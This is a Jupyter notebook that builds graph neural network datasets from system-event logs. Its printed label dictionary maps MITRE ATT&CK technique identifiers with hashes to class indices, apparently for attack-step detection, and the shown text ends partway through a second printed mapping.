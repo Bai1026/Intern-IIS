{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "02f1136c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import json\n",
    "import pickle\n",
    "import random\n",
    "import logging\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from glob import glob\n",
    "from tqdm.notebook import tqdm\n",
    "from sklearn.decomposition import PCA\n",
    "from sklearn.metrics import classification_report\n",
    "\n",
    "import dgl\n",
    "import dgl.nn as dglnn\n",
    "from dgl.nn import GraphConv, GATConv, SAGEConv\n",
    "\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.nn.functional as F\n",
    "from torch.optim import AdamW, lr_scheduler\n",
    "from torch.utils.data import Dataset, DataLoader\n",
    "from transformers import get_linear_schedule_with_warmup\n",
    "\n",
    "os.environ['CUDA_VISIBLE_DEVICES'] = \"0\"\n",
    "device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n",
    "logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0c4ff748-50ee-47f4-b061-5965fe828e78",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def build_dictionary(file_path):\n",
    "    with open(file_path, 'r') as file:\n",
    "        next(file)\n",
    "        # 使用正则表达式去除行末的数字\n",
    "        dictionary = {re.sub(r'\\s\\d+$', '', line.strip()): index for index, line in enumerate(file)}\n",
    "    return dictionary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "aeb4978b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# with open(\"./relations.txt\") as fp:\n",
    "#     relations = [r.strip() for r in fp.readlines()]\n",
    "    \n",
    "# with open(\"../data/3_openKE_2/label2id.txt\", \"r\") as fp:\n",
    "#     label2index = fp.load()\n",
    "# with open(\"./index2label.pkl\", \"rb\") as fp:\n",
    "#     index2label = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16c456ce",
   "metadata": {},
   "source": [
    "# Make dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "31b80e89",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_value(event):\n",
    "    global type2attr\n",
    "\n",
    "    srcUUID = event[\"srcNode\"][\"UUID\"]\n",
    "    srcType = event[\"srcNode\"][\"Type\"]\n",
    "    srcAttr = event[\"srcNode\"][type2attr[srcType]]\n",
    "    dstUUID = event[\"dstNode\"][\"UUID\"] if event[\"dstNode\"] != None else srcUUID\n",
    "    dstType = event[\"dstNode\"][\"Type\"] if event[\"dstNode\"] != None else srcType\n",
    "    dstAttr = event[\"dstNode\"][type2attr[dstType]] if event[\"dstNode\"] != None else srcAttr\n",
    "    return srcUUID, srcAttr, dstUUID, dstAttr, event[\"relation\"], event[\"label\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ad9dc377",
   "metadata": {},
   "outputs": [],
   "source": [
    "def make_dataset(dataset):\n",
    "    global node_ent2idx, edge_ent2idx, node_ent2emb, edge_ent2emb\n",
    "\n",
    "    data_list = []\n",
    "    for p in tqdm(dataset):\n",
    "        with open(p) as fp:\n",
    "            events = json.load(fp)\n",
    "            \n",
    "        nodes = set()\n",
    "        edges = []\n",
    "        relations = []\n",
    "        labels = []\n",
    "        uuid2res = {}\n",
    "        for e in events:\n",
    "            srcUUID, srcAttr, dstUUID, dstAttr, rel, label = get_value(e)\n",
    "\n",
    "            uuid2res[srcUUID], uuid2res[dstUUID] = srcAttr, dstAttr\n",
    "            nodes.add(srcUUID)\n",
    "            nodes.add(dstUUID)\n",
    "            edges.append((srcUUID, dstUUID))\n",
    "            relations.append(edge_ent2idx[rel])\n",
    "            labels.append(label2index[label])\n",
    "        nodes = list(nodes)  \n",
    "        node_feat = [torch.tensor(node_ent2emb[node_ent2idx[uuid2res[uuid]]], dtype=torch.float32) for uuid in nodes]\n",
    "        edge_attr = [torch.tensor(edge_ent2emb[idx], dtype=torch.float32) for idx in relations]\n",
    "\n",
    "        src = [nodes.index(src_uuid) for src_uuid, dst_uuid in edges]\n",
    "        dst = [nodes.index(dst_uuid) for src_uuid, dst_uuid in edges]\n",
    "        edge_index = torch.tensor([src, dst], dtype=torch.long)\n",
    "\n",
    "        \n",
    "        data_list.append({\n",
    "            \"labels\": labels,\n",
    "            \"num_nodes\": len(nodes),\n",
    "            \"node_feat\": node_feat,\n",
    "            \"edge_attr\": edge_attr,\n",
    "            \"edge_index\": edge_index\n",
    "        })\n",
    "    return data_list         "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab34d901-efd9-4d82-b363-45d02c98683c",
   "metadata": {},
   "source": [
    "### Directly change the entity to index and change the index into embedding\n",
    "- need ent -> index\n",
    "- need ent -> embedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d11ca333-c73c-4368-a704-9ae40d6e96f5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'T1112_34041639e6e501856ecaf5969ee29c76_I': 0,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I': 1,\n",
       " 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B': 2,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B': 3,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I': 4,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B': 5,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I': 6,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_B': 7,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_B': 8,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B': 9,\n",
       " 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B': 10,\n",
       " 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B': 11,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_B': 12,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B': 13,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I': 14,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_I': 15,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B': 16,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B': 17,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I': 18,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I': 19,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I': 20,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B': 21,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_B': 22,\n",
       " 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B': 23,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B': 24,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B': 25,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I': 26,\n",
       " 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B': 27,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B': 28,\n",
       " 'T1053.005_ee454be9197890de62705ce6255933fd_B': 29,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_I': 30,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B': 31,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I': 32,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_I': 33,\n",
       " 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B': 34,\n",
       " 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B': 35,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I': 36,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B': 37,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_I': 38,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I': 39,\n",
       " 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B': 40,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I': 41,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_I': 42,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I': 43,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_B': 44,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_B': 45,\n",
       " 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I': 46,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I': 47,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I': 48,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_B': 49,\n",
       " 'T1531_b25ae80dad74142fafb510e9c1949ace_B': 50,\n",
       " 'T1047_6935e41353aa781bb723462d26114c44_B': 51,\n",
       " 'T1018_a44bb43474728496276d5d73aa14588f_B': 52,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_I': 53,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I': 54,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_I': 55,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B': 56,\n",
       " 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B': 57,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_B': 58,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B': 59,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B': 60,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I': 61,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I': 62,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_B': 63,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I': 64,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I': 65,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_B': 66,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B': 67,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_I': 68,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I': 69,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I': 70,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B': 71,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I': 72,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B': 73,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B': 74,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_I': 75,\n",
       " 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B': 76,\n",
       " 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B': 77,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I': 78,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B': 79,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I': 80,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_I': 81,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_I': 82,\n",
       " 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B': 83,\n",
       " 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B': 84,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B': 85,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I': 86,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I': 87,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_I': 88,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_B': 89,\n",
       " 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B': 90,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I': 91,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I': 92,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_B': 93,\n",
       " 'T1069.002_6103e503cb444bc7b4187704f2035708_B': 94,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_B': 95,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I': 96,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I': 97,\n",
       " 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B': 98,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I': 99,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I': 100,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I': 101,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I': 102,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I': 103,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I': 104,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B': 105,\n",
       " 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B': 106,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_I': 107,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B': 108,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B': 109,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B': 110,\n",
       " 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B': 111,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I': 112,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B': 113,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_B': 114,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_I': 115,\n",
       " 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B': 116,\n",
       " 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B': 117,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B': 118,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_B': 119,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_B': 120,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_I': 121,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I': 122,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B': 123,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I': 124,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B': 125,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B': 126,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B': 127,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_B': 128,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B': 129,\n",
       " 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B': 130,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B': 131,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_B': 132,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_B': 133,\n",
       " 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B': 134,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B': 135,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_I': 136,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B': 137,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B': 138,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_I': 139,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B': 140,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_B': 141,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B': 142,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_I': 143,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B': 144,\n",
       " 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B': 145,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_I': 146,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I': 147,\n",
       " 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B': 148,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I': 149,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_B': 150,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B': 151,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I': 152,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_I': 153,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B': 154,\n",
       " 'T1201_57296a2ddbeb7423c05feef2fe972111_B': 155,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B': 156,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I': 157,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I': 158,\n",
       " 'T1490_e90756bb6dcd21462dc4cc452661df91_B': 159,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_B': 160,\n",
       " 'T1007_d6bb2a19da7246731ed9c44831b135f8_B': 161,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B': 162,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_B': 163,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I': 164,\n",
       " 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B': 165,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_I': 166,\n",
       " 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B': 167,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B': 168,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_I': 169,\n",
       " 'T1531_aa6b15485a5f50ced34d87fda177b758_B': 170,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B': 171,\n",
       " 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B': 172,\n",
       " 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B': 173,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B': 174,\n",
       " 'T1016_71b3d2945679566b9d94d8cb11df4b70_B': 175,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B': 176,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B': 177,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B': 178,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_I': 179,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B': 180,\n",
       " 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B': 181,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_B': 182,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B': 183,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B': 184,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I': 185,\n",
       " 'T1490_c156ac5c9fa67080365268d95f29053d_B': 186,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B': 187,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I': 188,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I': 189,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_I': 190,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_I': 191,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B': 192,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_I': 193,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_B': 194,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I': 195,\n",
       " 'T1490_8467c994685ccf178db166964bd80fab_B': 196,\n",
       " 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B': 197,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B': 198,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I': 199,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_B': 200,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B': 201,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B': 202,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I': 203,\n",
       " 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B': 204,\n",
       " 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B': 205,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_I': 206,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I': 207,\n",
       " 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B': 208,\n",
       " 'T1482_cfb61005899996469ae3023796792ca5_B': 209,\n",
       " 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B': 210,\n",
       " 'T1003.003_f049b89533298c2d6cd37a940248b219_B': 211,\n",
       " 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B': 212,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I': 213,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_I': 214,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_B': 215,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_I': 216,\n",
       " 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B': 217,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B': 218,\n",
       " 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B': 219,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_B': 220,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I': 221,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I': 222,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_B': 223,\n",
       " 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B': 224,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I': 225,\n",
       " 'T1112_34041639e6e501856ecaf5969ee29c76_B': 226,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I': 227,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B': 228,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I': 229,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_I': 230,\n",
       " 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B': 231,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_I': 232,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B': 233,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_I': 234,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_B': 235,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I': 236,\n",
       " 'T1049_a14392d713dffba6a397682ff83259a0_B': 237,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_I': 238,\n",
       " 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B': 239,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B': 240,\n",
       " 'T1047_b0255b5120cbabc062d8d4510a142c3b_B': 241,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_B': 242,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_B': 243,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I': 244,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I': 245,\n",
       " 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B': 246,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_I': 247,\n",
       " 'T1018_ac20e592bc912bddff4d6b88289095f0_B': 248,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_I': 249,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B': 250,\n",
       " 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B': 251,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I': 252,\n",
       " 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B': 253,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I': 254,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B': 255,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I': 256,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_B': 257,\n",
       " 'O': 258,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I': 259,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_B': 260,\n",
       " 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B': 261,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B': 262,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B': 263,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_I': 264,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B': 265,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I': 266,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_I': 267,\n",
       " 'T1016_7d8ee68f0e9731db82964f558f614608_B': 268,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B': 269,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B': 270,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_B': 271,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_B': 272,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_B': 273}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/label2id.txt'  # 替換為您檔案的路徑\n",
    "label2index = build_dictionary(file_path)\n",
    "\n",
    "label2index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "09049fca-0895-43d8-be49-3368f7c82ada",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{0: 'T1112_34041639e6e501856ecaf5969ee29c76_I',\n",
       " 1: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I',\n",
       " 2: 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B',\n",
       " 3: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B',\n",
       " 4: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I',\n",
       " 5: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B',\n",
       " 6: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I',\n",
       " 7: 'T1547.001_777043894e42d2aae3881e63f6c76d33_B',\n",
       " 8: 'T1047_f4b0b4129560ea66f9751275e82f6bab_B',\n",
       " 9: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B',\n",
       " 10: 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B',\n",
       " 11: 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B',\n",
       " 12: 'T1016_921055f4-5970-4707-909e-62f594234d91_B',\n",
       " 13: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B',\n",
       " 14: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I',\n",
       " 15: 'T1564.004_76b6066fe170d38215251102e42be973_I',\n",
       " 16: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B',\n",
       " 17: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B',\n",
       " 18: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I',\n",
       " 19: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I',\n",
       " 20: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I',\n",
       " 21: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B',\n",
       " 22: 'T1105_1095434782a00c8a4772a11e625bcf5d_B',\n",
